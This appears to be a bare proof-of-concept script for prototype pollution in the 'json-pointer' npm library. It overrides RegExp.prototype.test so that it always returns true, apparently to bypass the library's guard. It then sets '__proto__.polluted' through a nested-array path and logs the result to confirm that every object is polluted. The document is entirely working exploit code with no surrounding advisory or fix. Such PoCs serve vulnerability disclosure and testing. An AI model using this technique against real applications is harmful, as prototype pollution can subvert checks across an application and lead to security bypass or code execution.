RegExp.prototype.test = () => true;
const pointer = require('json-pointer');
let obj = {};
console.log({}.polluted);
pointer.set({}, [
    ['__proto__'],
    'polluted'
], 'yes');
console.log({}.polluted);